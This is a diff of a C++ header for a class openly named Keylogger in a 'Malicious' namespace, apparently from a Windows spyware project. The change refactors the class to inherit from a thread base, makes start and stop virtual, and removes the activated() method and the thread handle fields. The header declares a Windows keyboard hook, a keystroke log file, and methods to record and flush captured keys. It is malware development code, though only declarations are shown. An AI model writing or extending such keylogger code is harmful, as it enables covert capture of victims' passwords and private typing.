@@ -5,13 +5,14 @@
 #include <fstream>
 #include <windows.h>
 #include <common/Singleton.hpp>
+#include <system/Thread.hpp>
 
 namespace Malicious
 {
     typedef __declspec(dllexport) LRESULT (CALLBACK *HookProc) ( int nCode,  WPARAM wParam,  LPARAM lParam);
 
     // Intercepteur de touches
-	class Keylogger : public Common::Singleton<Keylogger>
+	class Keylogger : public Common::Singleton<Keylogger>, public System::Thread
     {
         friend class Common::Singleton<Keylogger>;
 
@@ -26,10 +27,12 @@ namespace Malicious
             const std::string& get_keylog_path(){return log_file;}
             void setKeylog(const std::string& file);
             void flush();
-            void start();
-            void stop();
+            
+			virtual void start();
+            virtual void stop();
+
             void clearKeylog();
-            bool activated();
+            
             void addKey(const char key);
             HHOOK getHook(){return hook;}
 
@@ -39,8 +42,6 @@ namespace Malicious
         private:
 
             HHOOK hook;
-            DWORD dwThread;
-            HANDLE hThread;
             std::string log_file;
             std::fstream log;
             bool isActivated;
